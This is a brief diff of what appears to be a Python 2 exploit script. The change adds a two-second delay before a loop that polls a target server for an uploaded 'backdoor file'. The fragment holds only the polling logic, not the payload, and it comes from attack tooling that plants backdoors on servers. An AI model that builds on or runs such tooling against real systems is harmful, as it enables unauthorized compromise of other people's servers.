@@ -98,6 +98,7 @@ if req2.getcode() == 201:
 # poll for backdoor file for 2 minutes, every 30 seconds
 endTime = time.time() + 120 
 downloadURL = hostIP + outdir + uploadFileName
+time.sleep(2)
 while time.time() < endTime:
     print '[*] trying to get file...' + downloadURL
     try:
